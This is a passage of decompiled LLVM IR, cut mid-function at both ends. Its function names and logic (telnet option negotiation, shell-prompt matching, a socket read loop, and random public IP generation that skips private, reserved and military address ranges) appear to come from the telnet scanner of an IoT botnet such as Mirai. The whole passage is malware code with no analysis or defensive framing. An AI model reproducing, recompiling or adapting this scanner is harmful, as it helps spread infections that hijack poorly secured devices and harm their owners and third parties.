dec_label_pc_a21c:                                ; preds = %dec_label_pc_a1fc
  store i32 %v5_a1c8, i32* @r4, align 4
  %v3_a224 = mul i32 %v2_a1c8, 4
  %v1_a228 = add i32 %v1_a158, -4
  %v2_a234 = add i32 %v1_a228, %v3_a224
  %v2_a23c = inttoptr i32 %v2_a234 to i32*
  store i32 %v0_a0e8, i32* %v2_a23c, align 4
  %v2_a244 = load i32, i32* @global_var_2db88.67, align 4
  store i32 %v2_a244, i32* @r0, align 4
  %v0_a24c = call i32 @free()
  store i32 %v1_a158, i32* @global_var_2db88.67, align 4
  br label %dec_label_pc_a264

dec_label_pc_a264:                                ; preds = %entry, %dec_label_pc_a21c
  store i32 %v3_a0dc, i32* @r4, align 4
  store i32 %v6_a0dc, i32* @r5, align 4
  store i32 %v9_a0dc, i32* @r6, align 4
  store i32 %v12_a0dc, i32* @fp, align 4
  ret i32 %v0_a0e8

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a174, { 1, 0 }
  uselistorder i32 %v1_a158, { 2, 0, 1 }
  uselistorder i32 %v2_a11c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_a264, { 1, 0 }
  uselistorder label %dec_label_pc_a1b0, { 1, 0 }
  uselistorder label %dec_label_pc_a170, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a2a0 = add i32 %arg2, 1
  %v1_a2a4 = inttoptr i32 %v1_a2a0 to i8*
  %v2_a2a4 = load i8, i8* %v1_a2a4, align 1
  %v7_a2b0 = icmp ult i8 %v2_a2a4, -5
  br i1 %v7_a2b0, label %dec_label_pc_a3fc, label %dec_label_pc_a2b8

dec_label_pc_a2b8:                                ; preds = %entry
  %v7_a2c0 = icmp eq i8 %v2_a2a4, -1
  br i1 %v7_a2c0, label %dec_label_pc_a2c4, label %dec_label_pc_a2e0

dec_label_pc_a2c4:                                ; preds = %dec_label_pc_a2b8
  br label %dec_label_pc_a3fc

dec_label_pc_a2e0:                                ; preds = %dec_label_pc_a2b8
  store i8 -1, i8* %stack_var_-17, align 1
  %v2_a2e8 = ptrtoint i8* %stack_var_-17 to i32
  %v5_a2fc = call i32 @__libc_send(i32 %arg1, i32 %v2_a2e8, i32 1, i32 16384)
  %v2_a308 = load i8, i8* %v1_a2a4, align 1
  %v7_a30c = icmp eq i8 %v2_a308, -4
  br i1 %v7_a30c, label %dec_label_pc_a314, label %dec_label_pc_a320

dec_label_pc_a314:                                ; preds = %dec_label_pc_a2e0
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3c0

dec_label_pc_a320:                                ; preds = %dec_label_pc_a2e0
  %v2_a328 = load i8, i8* %v1_a2a4, align 1
  %v7_a32c = icmp eq i8 %v2_a328, -2
  br i1 %v7_a32c, label %dec_label_pc_a334, label %dec_label_pc_a340

dec_label_pc_a334:                                ; preds = %dec_label_pc_a320
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3c0

dec_label_pc_a340:                                ; preds = %dec_label_pc_a320
  %v2_a348 = load i8, i8* %v1_a2a4, align 1
  %v7_a34c = icmp eq i8 %v2_a348, 3
  %v7_a360 = icmp eq i8 %v2_a348, -3
  br i1 %v7_a34c, label %dec_label_pc_a354, label %dec_label_pc_a38c

dec_label_pc_a354:                                ; preds = %dec_label_pc_a340
  br i1 %v7_a360, label %dec_label_pc_a368, label %dec_label_pc_a374

dec_label_pc_a368:                                ; preds = %dec_label_pc_a354
  br label %dec_label_pc_a37c

dec_label_pc_a374:                                ; preds = %dec_label_pc_a354
  br label %dec_label_pc_a37c

dec_label_pc_a37c:                                ; preds = %dec_label_pc_a368, %dec_label_pc_a374
  %storemerge = phi i8 [ -3, %dec_label_pc_a374 ], [ -5, %dec_label_pc_a368 ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3c0

dec_label_pc_a38c:                                ; preds = %dec_label_pc_a340
  br i1 %v7_a360, label %dec_label_pc_a3a0, label %dec_label_pc_a3ac

dec_label_pc_a3a0:                                ; preds = %dec_label_pc_a38c
  br label %dec_label_pc_a3b4

dec_label_pc_a3ac:                                ; preds = %dec_label_pc_a38c
  br label %dec_label_pc_a3b4

dec_label_pc_a3b4:                                ; preds = %dec_label_pc_a3a0, %dec_label_pc_a3ac
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a3ac ], [ -4, %dec_label_pc_a3a0 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a3c0

dec_label_pc_a3c0:                                ; preds = %dec_label_pc_a37c, %dec_label_pc_a334, %dec_label_pc_a314, %dec_label_pc_a3b4
  %v4_a3d4 = call i32 @__libc_send(i32 %arg1, i32 %v2_a2e8, i32 1, i32 16384)
  %v1_a3dc = add i32 %arg2, 2
  %v4_a3f0 = call i32 @__libc_send(i32 %arg1, i32 %v1_a3dc, i32 1, i32 16384)
  br label %dec_label_pc_a3fc

dec_label_pc_a3fc:                                ; preds = %dec_label_pc_a2c4, %dec_label_pc_a3c0, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a3fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a3c0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a3b4, { 1, 0 }
  uselistorder label %dec_label_pc_a37c, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a430 = call i32 @strlen(i8* %arg1)
  %v2_a478 = add i32 %v3_a430, %tmp
  br label %dec_label_pc_a54c

dec_label_pc_a450:                                ; preds = %dec_label_pc_a4d8, %dec_label_pc_a4b4, %dec_label_pc_a490, %dec_label_pc_a46c
  %v1_a454 = add nsw i32 %stack_var_-28.014, 1
  %v7_a468 = icmp sgt i32 %v3_a430, %v1_a454
  br i1 %v7_a468, label %dec_label_pc_a46c, label %dec_label_pc_a4fc

dec_label_pc_a46c:                                ; preds = %dec_label_pc_a45c.preheader, %dec_label_pc_a450
  %stack_var_-28.014 = phi i32 [ %v1_a454, %dec_label_pc_a450 ], [ %stack_var_-28.1, %dec_label_pc_a45c.preheader ]
  %v2_a480 = sub i32 %v2_a478, %stack_var_-28.014
  %v1_a484 = inttoptr i32 %v2_a480 to i8*
  %v2_a484 = load i8, i8* %v1_a484, align 1
  %v2_a488 = icmp eq i8 %v2_a484, 0
  br i1 %v2_a488, label %dec_label_pc_a450, label %dec_label_pc_a490

dec_label_pc_a490:                                ; preds = %dec_label_pc_a46c
  %v2_a4a8 = load i8, i8* %v1_a484, align 1
  %v7_a4ac = icmp eq i8 %v2_a4a8, 32
  br i1 %v7_a4ac, label %dec_label_pc_a450, label %dec_label_pc_a4b4

dec_label_pc_a4b4:                                ; preds = %dec_label_pc_a490
  %v2_a4cc = load i8, i8* %v1_a484, align 1
  %v7_a4d0 = icmp eq i8 %v2_a4cc, 13
  br i1 %v7_a4d0, label %dec_label_pc_a450, label %dec_label_pc_a4d8

dec_label_pc_a4d8:                                ; preds = %dec_label_pc_a4b4
  %v2_a4f0 = load i8, i8* %v1_a484, align 1
  %v7_a4f4 = icmp eq i8 %v2_a4f0, 10
  br i1 %v7_a4f4, label %dec_label_pc_a450, label %dec_label_pc_a4fc

dec_label_pc_a4fc:                                ; preds = %dec_label_pc_a4d8, %dec_label_pc_a450, %dec_label_pc_a45c.preheader
  %stack_var_-28.0.lcssa = phi i32 [ %stack_var_-28.1, %dec_label_pc_a45c.preheader ], [ %stack_var_-28.014, %dec_label_pc_a4d8 ], [ %v1_a454, %dec_label_pc_a450 ]
  %v2_a510 = sub i32 %v2_a478, %stack_var_-28.0.lcssa
  %v1_a514 = inttoptr i32 %v2_a510 to i8*
  %v2_a514 = load i8, i8* %v1_a514, align 1
  %v2_a524 = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_1cbb0.69 to i32)
  %v1_a528 = inttoptr i32 %v2_a524 to i8*
  %v2_a528 = load i8, i8* %v1_a528, align 1
  %v9_a52c = icmp eq i8 %v2_a514, %v2_a528
  %v1_a544 = add i32 %storemerge3, 1
  br i1 %v9_a52c, label %dec_label_pc_a56c, label %dec_label_pc_a54c

dec_label_pc_a54c:                                ; preds = %dec_label_pc_a4fc, %entry
  %stack_var_-28.1 = phi i32 [ 0, %entry ], [ %stack_var_-28.0.lcssa, %dec_label_pc_a4fc ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_a544, %dec_label_pc_a4fc ]
  %v3_a554 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1cbb0.69, i32 0, i32 0))
  %v3_a55c = icmp ult i32 %storemerge3, %v3_a554
  br i1 %v3_a55c, label %dec_label_pc_a45c.preheader, label %dec_label_pc_a56c

dec_label_pc_a45c.preheader:                      ; preds = %dec_label_pc_a54c
  %v7_a46813 = icmp sgt i32 %v3_a430, %stack_var_-28.1
  br i1 %v7_a46813, label %dec_label_pc_a46c, label %dec_label_pc_a4fc

dec_label_pc_a56c:                                ; preds = %dec_label_pc_a54c, %dec_label_pc_a4fc
  %storemerge4 = phi i32 [ 1, %dec_label_pc_a4fc ], [ 0, %dec_label_pc_a54c ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %stack_var_-28.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-28.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a430, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a4fc, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a588 = load i32, i32* @fp, align 4
  store i32 %v3_a588, i32* %stack_var_-16, align 4
  %v13_a588 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a5d8 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a618 = udiv i32 %arg1, 32
  %v3_a624 = mul nuw nsw i32 %v3_a618, 4
  %v1_a63c = urem i32 %arg1, 32
  %v6_a644 = shl i32 1, %v1_a63c
  %v1_a668 = add i32 %arg1, 1
  %v2_a670 = ptrtoint i32* %stack_var_-176 to i32
  %v6_a790 = inttoptr i32 %arg2 to i8*
  %v2_a7a4 = icmp eq i32 %arg3, 0
  %v1_a7b0 = inttoptr i32 %arg6 to i8*
  %v5_a7f4 = icmp sgt i32 %arg5, 0
  %v2_a62c = add nsw i32 %v3_a624, -152
  %v2_a630 = add i32 %v2_a62c, %v13_a588
  %v1_a634 = inttoptr i32 %v2_a630 to i32*
  br label %dec_label_pc_a7cc

dec_label_pc_a5ec.lr.ph:                          ; preds = %dec_label_pc_a7e0, %dec_label_pc_a7ec
  br label %dec_label_pc_a5ec

dec_label_pc_a5ec:                                ; preds = %dec_label_pc_a5ec.lr.ph, %dec_label_pc_a5ec
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a5ec.lr.ph ], [ %v1_a600, %dec_label_pc_a5ec ]
  %v5_a5f8 = mul nuw nsw i32 %storemerge27, 4
  %v6_a5f8 = add i32 %v5_a5f8, %v2_a5d8
  %v7_a5f8 = inttoptr i32 %v6_a5f8 to i32*
  store i32 0, i32* %v7_a5f8, align 4
  %v1_a600 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a600, 32
  br i1 %tmp30, label %dec_label_pc_a5ec, label %dec_label_pc_a614

dec_label_pc_a614:                                ; preds = %dec_label_pc_a5ec
  %v2_a634 = load i32, i32* %v1_a634, align 4
  %v2_a648 = or i32 %v2_a634, %v6_a644
  store i32 %v2_a648, i32* %v1_a634, align 4
  %v5_a684 = call i32 @__libc_select(i32 %v1_a668, i32 %v2_a5d8, i32 0, i32 0, i32 %v2_a670)
  %tmp31 = icmp slt i32 %v5_a684, 1
  br i1 %tmp31, label %dec_label_pc_a810, label %dec_label_pc_a694

dec_label_pc_a694:                                ; preds = %dec_label_pc_a614
  %v2_a6a0 = add i32 %stack_var_-40.0, %arg6
  %v5_a6a4 = inttoptr i32 %v2_a6a0 to i8*
  %v6_a6b8 = call i32 @__libc_recv(i32 %arg1, i32 %v2_a6a0, i32 1, i32 0, i32 %v2_a6a0)
  %v7_a6c8 = icmp eq i32 %v6_a6b8, -1
  br i1 %v7_a6c8, label %dec_label_pc_a6dc, label %dec_label_pc_a6d0

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a694
  %v2_a6d4 = icmp eq i32 %v6_a6b8, 0
  br i1 %v2_a6d4, label %dec_label_pc_a6dc, label %dec_label_pc_a6e8

dec_label_pc_a6dc:                                ; preds = %dec_label_pc_a6d0, %dec_label_pc_a694
  br label %dec_label_pc_a818

dec_label_pc_a6e8:                                ; preds = %dec_label_pc_a6d0
  %v2_a6f0 = add i32 %v6_a6b8, %stack_var_-40.0
  %v2_a6fc = load i8, i8* %v5_a6a4, align 1
  %v2_a700 = icmp eq i8 %v2_a6fc, -1
  br i1 %v2_a700, label %dec_label_pc_a708, label %dec_label_pc_a788

dec_label_pc_a708:                                ; preds = %dec_label_pc_a6e8
  %v1_a70c = add i32 %v2_a6a0, 1
  %v5_a720 = call i32 @__libc_recv(i32 %arg1, i32 %v1_a70c, i32 2, i32 0, i32 %v2_a6f0)
  %v7_a730 = icmp eq i32 %v5_a720, -1
  br i1 %v7_a730, label %dec_label_pc_a744, label %dec_label_pc_a738

dec_label_pc_a738:                                ; preds = %dec_label_pc_a708
  %v2_a73c = icmp eq i32 %v5_a720, 0
  br i1 %v2_a73c, label %dec_label_pc_a744, label %dec_label_pc_a750

dec_label_pc_a744:                                ; preds = %dec_label_pc_a738, %dec_label_pc_a708
  br label %dec_label_pc_a818

dec_label_pc_a750:                                ; preds = %dec_label_pc_a738
  %v2_a758 = add i32 %v5_a720, %v2_a6f0
  %v5_a76c = call i32 @negotiate(i32 %arg1, i32 %v2_a6a0, i32 3, i32 %v2_a758, i32 %v2_a758)
  %v2_a774 = icmp eq i32 %v5_a76c, 0
  br i1 %v2_a774, label %dec_label_pc_a77c, label %dec_label_pc_a7cc

dec_label_pc_a77c:                                ; preds = %dec_label_pc_a750
  br label %dec_label_pc_a818

dec_label_pc_a788:                                ; preds = %dec_label_pc_a6e8
  %v3_a6fc = zext i8 %v2_a6fc to i32
  %v7_a790 = call i32 @strstr(i32 %arg6, i8* %v6_a790, i32 %stack_var_-40.0, i32 %v3_a6fc, i32 %v2_a6f0, i32 %v6_a6b8)
  %v2_a798 = icmp eq i32 %v7_a790, 0
  br i1 %v2_a798, label %dec_label_pc_a7a0, label %dec_label_pc_a804

dec_label_pc_a7a0:                                ; preds = %dec_label_pc_a788
  br i1 %v2_a7a4, label %dec_label_pc_a7cc, label %dec_label_pc_a7ac

dec_label_pc_a7ac:                                ; preds = %dec_label_pc_a7a0
  %v2_a7b0 = call i32 @matchPrompt(i8* %v1_a7b0)
  %v2_a7b8 = icmp eq i32 %v2_a7b0, 0
  br i1 %v2_a7b8, label %dec_label_pc_a7cc, label %dec_label_pc_a804

dec_label_pc_a7cc:                                ; preds = %dec_label_pc_a750, %dec_label_pc_a7ac, %dec_label_pc_a7a0, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a758, %dec_label_pc_a750 ], [ %v2_a6f0, %dec_label_pc_a7a0 ], [ %v2_a6f0, %dec_label_pc_a7ac ]
  %v1_a7d0 = add i32 %stack_var_-40.0, 2
  %v6_a7dc = icmp slt i32 %v1_a7d0, %arg7
  br i1 %v6_a7dc, label %dec_label_pc_a7e0, label %dec_label_pc_a810

dec_label_pc_a7e0:                                ; preds = %dec_label_pc_a7cc
  %v3_a7e0 = load i32, i32* %stack_var_-176, align 4
  %v5_a7e8 = icmp sgt i32 %v3_a7e0, 0
  br i1 %v5_a7e8, label %dec_label_pc_a5ec.lr.ph, label %dec_label_pc_a7ec

dec_label_pc_a7ec:                                ; preds = %dec_label_pc_a7e0
  br i1 %v5_a7f4, label %dec_label_pc_a5ec.lr.ph, label %dec_label_pc_a810

dec_label_pc_a804:                                ; preds = %dec_label_pc_a788, %dec_label_pc_a7ac
  br label %dec_label_pc_a818

dec_label_pc_a810:                                ; preds = %dec_label_pc_a614, %dec_label_pc_a7ec, %dec_label_pc_a7cc
  br label %dec_label_pc_a818

dec_label_pc_a818:                                ; preds = %dec_label_pc_a804, %dec_label_pc_a77c, %dec_label_pc_a744, %dec_label_pc_a6dc, %dec_label_pc_a810
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a810 ], [ 1, %dec_label_pc_a804 ], [ 0, %dec_label_pc_a6dc ], [ 0, %dec_label_pc_a744 ], [ 0, %dec_label_pc_a77c ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 3, 1, 0, 2 }
  uselistorder i32 %v5_a720, { 1, 2, 0 }
  uselistorder i8 %v2_a6fc, { 1, 0 }
  uselistorder i32 %v2_a6f0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v6_a6b8, { 2, 1, 3, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a5d8, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a818, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a810, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a804, { 1, 0 }
  uselistorder label %dec_label_pc_a7cc, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a5ec, { 1, 0 }
  uselistorder label %dec_label_pc_a5ec.lr.ph, { 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a830 = load i32, i32* @r4, align 4
  %v6_a830 = load i32, i32* @fp, align 4
  %v13_a830 = load i32, i32* @lr, align 4
  store i32 43064, i32* %stack_var_-4, align 4
  %v2_a834 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a834, i32* @fp, align 4
  %v0_a83c = call i32 @rand()
  %v2_a858 = sdiv i32 %v0_a83c, 49
  %tmp27 = mul i32 %v2_a858, -223
  %v2_a878 = add i32 %tmp27, %v0_a83c
  %v1_a88c = trunc i32 %v2_a878 to i8
  store i8 %v1_a88c, i8* bitcast (i8** @global_var_27933.72 to i8*), align 4
  %v0_a890 = call i32 @rand()
  %v2_a8ac = sdiv i32 %v0_a890, 51
  %tmp28 = mul i32 %v2_a8ac, -255
  %v2_a8c4 = add i32 %tmp28, %v0_a890
  %v1_a8d8 = trunc i32 %v2_a8c4 to i8
  store i8 %v1_a8d8, i8* @global_var_27934.74, align 1
  %v0_a8dc = call i32 @rand()
  %v2_a8f8 = sdiv i32 %v0_a8dc, 51
  %tmp29 = mul i32 %v2_a8f8, -255
  %v2_a910 = add i32 %tmp29, %v0_a8dc
  %v1_a924 = trunc i32 %v2_a910 to i8
  store i8 %v1_a924, i8* @global_var_27935.75, align 1
  %v0_a928 = call i32 @rand()
  %v2_a944 = sdiv i32 %v0_a928, 51
  %tmp = mul i32 %v2_a944, -255
  %v2_a95c = add i32 %v0_a928, %tmp
  %extract.t = trunc i32 %v2_a95c to i8
  br label %dec_label_pc_aab0

dec_label_pc_a978:                                ; preds = %dec_label_pc_acc0, %dec_label_pc_acb0, %dec_label_pc_aca0, %dec_label_pc_ac90, %dec_label_pc_ac80, %dec_label_pc_ac70, %dec_label_pc_ac60, %dec_label_pc_ac50, %dec_label_pc_ac40, %dec_label_pc_ac30, %dec_label_pc_ac20, %dec_label_pc_ac10, %dec_label_pc_ac00, %dec_label_pc_abf0, %dec_label_pc_abe0, %dec_label_pc_abb0, %dec_label_pc_ab90, %dec_label_pc_ab60, %dec_label_pc_ab30, %dec_label_pc_ab10, %dec_label_pc_ab00, %dec_label_pc_aaf0, %dec_label_pc_aae0, %dec_label_pc_aad0, %dec_label_pc_aac0, %dec_label_pc_aab0
  %v0_a978 = call i32 @rand()
  %v2_a994 = sdiv i32 %v0_a978, 49
  %tmp30 = mul i32 %v2_a994, -223
  %v2_a9b4 = add i32 %tmp30, %v0_a978
  %v1_a9c8 = trunc i32 %v2_a9b4 to i8
  store i8 %v1_a9c8, i8* bitcast (i8** @global_var_27933.72 to i8*), align 4
  %v0_a9cc = call i32 @rand()
  %v2_a9e8 = sdiv i32 %v0_a9cc, 51
  %tmp31 = mul i32 %v2_a9e8, -255
  %v2_aa00 = add i32 %tmp31, %v0_a9cc
  %v1_aa14 = trunc i32 %v2_aa00 to i8
  store i8 %v1_aa14, i8* @global_var_27934.74, align 1
  %v0_aa18 = call i32 @rand()
  %v2_aa34 = sdiv i32 %v0_aa18, 51
  %tmp32 = mul i32 %v2_aa34, -255
  %v2_aa4c = add i32 %tmp32, %v0_aa18
  %v1_aa60 = trunc i32 %v2_aa4c to i8
  store i8 %v1_aa60, i8* @global_var_27935.75, align 1
  %v0_aa64 = call i32 @rand()
  %v2_aa80 = sdiv i32 %v0_aa64, 51
  %tmp39 = mul i32 %v2_aa80, -255
  %v2_aa98 = add i32 %v0_aa64, %tmp39
  %extract.t38 = trunc i32 %v2_aa98 to i8
  br label %dec_label_pc_aab0

dec_label_pc_aab0:                                ; preds = %entry, %dec_label_pc_a978
  %v2_a95c.sink.off0 = phi i8 [ %extract.t, %entry ], [ %extract.t38, %dec_label_pc_a978 ]
  store i8 %v2_a95c.sink.off0, i8* @global_var_27936.76, align 1
  %v2_aab4 = load i8, i8* bitcast (i8** @global_var_27933.72 to i8*), align 4
  %v3_aab4 = zext i8 %v2_aab4 to i32
  %v7_aab8 = icmp eq i8 %v2_aab4, 127
  br i1 %v7_aab8, label %dec_label_pc_a978, label %dec_label_pc_aac0

dec_label_pc_aac0:                                ; preds = %dec_label_pc_aab0
  %v2_aac8 = icmp eq i8 %v2_aab4, 0
  br i1 %v2_aac8, label %dec_label_pc_a978, label %dec_label_pc_aad0

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aac0
  %v7_aad8 = icmp eq i8 %v2_aab4, 3
  br i1 %v7_aad8, label %dec_label_pc_a978, label %dec_label_pc_aae0

dec_label_pc_aae0:                                ; preds = %dec_label_pc_aad0
  %v7_aae8 = icmp eq i8 %v2_aab4, 15
  br i1 %v7_aae8, label %dec_label_pc_a978, label %dec_label_pc_aaf0

dec_label_pc_aaf0:                                ; preds = %dec_label_pc_aae0
  %v7_aaf8 = icmp eq i8 %v2_aab4, 16
  br i1 %v7_aaf8, label %dec_label_pc_a978, label %dec_label_pc_ab00

dec_label_pc_ab00:                                ; preds = %dec_label_pc_aaf0
  %v7_ab08 = icmp eq i8 %v2_aab4, 56
  br i1 %v7_ab08, label %dec_label_pc_a978, label %dec_label_pc_ab10

dec_label_pc_ab10:                                ; preds = %dec_label_pc_ab00
  %v7_ab18 = icmp eq i8 %v2_aab4, 10
  br i1 %v7_ab18, label %dec_label_pc_a978, label %dec_label_pc_ab20

dec_label_pc_ab20:                                ; preds = %dec_label_pc_ab10
  %v7_ab28 = icmp eq i8 %v2_aab4, -64
  br i1 %v7_ab28, label %dec_label_pc_ab30, label %dec_label_pc_ab40

dec_label_pc_ab30:                                ; preds = %dec_label_pc_ab20
  %v3_ab34 = load i8, i8* @global_var_27934.74, align 1
  %v7_ab38 = icmp eq i8 %v3_ab34, -88
  br i1 %v7_ab38, label %dec_label_pc_a978, label %dec_label_pc_ab40

dec_label_pc_ab40:                                ; preds = %dec_label_pc_ab20, %dec_label_pc_ab30
  %v7_ab48 = icmp eq i8 %v2_aab4, -84
  br i1 %v7_ab48, label %dec_label_pc_ab50, label %dec_label_pc_ab70

dec_label_pc_ab50:                                ; preds = %dec_label_pc_ab40
  %v3_ab54 = load i8, i8* @global_var_27934.74, align 1
  %tmp40 = icmp ult i8 %v3_ab54, 16
  br i1 %tmp40, label %dec_label_pc_ab70, label %dec_label_pc_ab60

dec_label_pc_ab60:                                ; preds = %dec_label_pc_ab50
  %tmp41 = icmp ult i8 %v3_ab54, 32
  br i1 %tmp41, label %dec_label_pc_a978, label %dec_label_pc_ab70

dec_label_pc_ab70:                                ; preds = %dec_label_pc_ab40, %dec_label_pc_ab60, %dec_label_pc_ab50
  %v7_ab78 = icmp eq i8 %v2_aab4, 100
  br i1 %v7_ab78, label %dec_label_pc_ab80, label %dec_label_pc_aba0

dec_label_pc_ab80:                                ; preds = %dec_label_pc_ab70
  %v3_ab84 = load i8, i8* @global_var_27934.74, align 1
  %tmp42 = icmp ult i8 %v3_ab84, 64
  br i1 %tmp42, label %dec_label_pc_aba0, label %dec_label_pc_ab90

dec_label_pc_ab90:                                ; preds = %dec_label_pc_ab80
  %tmp43 = icmp ult i8 %v3_ab84, 127
  br i1 %tmp43, label %dec_label_pc_a978, label %dec_label_pc_aba0

dec_label_pc_aba0:                                ; preds = %dec_label_pc_ab70, %dec_label_pc_ab90, %dec_label_pc_ab80
  %v7_aba8 = icmp eq i8 %v2_aab4, -87
  br i1 %v7_aba8, label %dec_label_pc_abb0, label %dec_label_pc_abc0

dec_label_pc_abb0:                                ; preds = %dec_label_pc_aba0
  %v3_abb4 = load i8, i8* @global_var_27934.74, align 1
  %v2_abb8 = icmp eq i8 %v3_abb4, -1
  br i1 %v2_abb8, label %dec_label_pc_a978, label %dec_label_pc_abc0

dec_label_pc_abc0:                                ; preds = %dec_label_pc_aba0, %dec_label_pc_abb0
  %v7_abc8 = icmp eq i8 %v2_aab4, -58
  br i1 %v7_abc8, label %dec_label_pc_abd0, label %dec_label_pc_abf0

dec_label_pc_abd0:                                ; preds = %dec_label_pc_abc0
  %v3_abd4 = load i8, i8* @global_var_27934.74, align 1
  %tmp44 = icmp ult i8 %v3_abd4, 18
  br i1 %tmp44, label %dec_label_pc_abf0, label %dec_label_pc_abe0

dec_label_pc_abe0:                                ; preds = %dec_label_pc_abd0
  %tmp45 = or i8 %v3_abd4, 1
  %tmp46 = icmp eq i8 %tmp45, 19
  br i1 %tmp46, label %dec_label_pc_a978, label %dec_label_pc_abf0

dec_label_pc_abf0:                                ; preds = %dec_label_pc_abc0, %dec_label_pc_abe0, %dec_label_pc_abd0
  %v7_abf8 = icmp eq i8 %v2_aab4, -32
  br i1 %v7_abf8, label %dec_label_pc_a978, label %dec_label_pc_ac00

dec_label_pc_ac00:                                ; preds = %dec_label_pc_abf0
  %v7_ac08 = icmp eq i8 %v2_aab4, 6
  br i1 %v7_ac08, label %dec_label_pc_a978, label %dec_label_pc_ac10

dec_label_pc_ac10:                                ; preds = %dec_label_pc_ac00
  %v7_ac18 = icmp eq i8 %v2_aab4, 7
  br i1 %v7_ac18, label %dec_label_pc_a978, label %dec_label_pc_ac20

dec_label_pc_ac20:                                ; preds = %dec_label_pc_ac10
  %v7_ac28 = icmp eq i8 %v2_aab4, 11
  br i1 %v7_ac28, label %dec_label_pc_a978, label %dec_label_pc_ac30

dec_label_pc_ac30:                                ; preds = %dec_label_pc_ac20
  %v7_ac38 = icmp eq i8 %v2_aab4, 21
  br i1 %v7_ac38, label %dec_label_pc_a978, label %dec_label_pc_ac40

dec_label_pc_ac40:                                ; preds = %dec_label_pc_ac30
  %v7_ac48 = icmp eq i8 %v2_aab4, 22
  br i1 %v7_ac48, label %dec_label_pc_a978, label %dec_label_pc_ac50

dec_label_pc_ac50:                                ; preds = %dec_label_pc_ac40
  %v7_ac58 = icmp eq i8 %v2_aab4, 26
  br i1 %v7_ac58, label %dec_label_pc_a978, label %dec_label_pc_ac60

dec_label_pc_ac60:                                ; preds = %dec_label_pc_ac50
  %v7_ac68 = icmp eq i8 %v2_aab4, 28
  br i1 %v7_ac68, label %dec_label_pc_a978, label %dec_label_pc_ac70

dec_label_pc_ac70:                                ; preds = %dec_label_pc_ac60
  %v7_ac78 = icmp eq i8 %v2_aab4, 29
  br i1 %v7_ac78, label %dec_label_pc_a978, label %dec_label_pc_ac80

dec_label_pc_ac80:                                ; preds = %dec_label_pc_ac70
  %v7_ac88 = icmp eq i8 %v2_aab4, 30
  br i1 %v7_ac88, label %dec_label_pc_a978, label %dec_label_pc_ac90

dec_label_pc_ac90:                                ; preds = %dec_label_pc_ac80
  %v7_ac98 = icmp eq i8 %v2_aab4, 33
  br i1 %v7_ac98, label %dec_label_pc_a978, label %dec_label_pc_aca0

dec_label_pc_aca0:                                ; preds = %dec_label_pc_ac90
  %v7_aca8 = icmp eq i8 %v2_aab4, 55
  br i1 %v7_aca8, label %dec_label_pc_a978, label %dec_label_pc_acb0

dec_label_pc_acb0:                                ; preds = %dec_label_pc_aca0
  %v7_acb8 = icmp eq i8 %v2_aab4, -42
  br i1 %v7_acb8, label %dec_label_pc_a978, label %dec_label_pc_acc0

dec_label_pc_acc0:                                ; preds = %dec_label_pc_acb0
  %v7_acc8 = icmp eq i8 %v2_aab4, -41
  br i1 %v7_acc8, label %dec_label_pc_a978, label %dec_label_pc_acd0

dec_label_pc_acd0:                                ; preds = %dec_label_pc_acc0
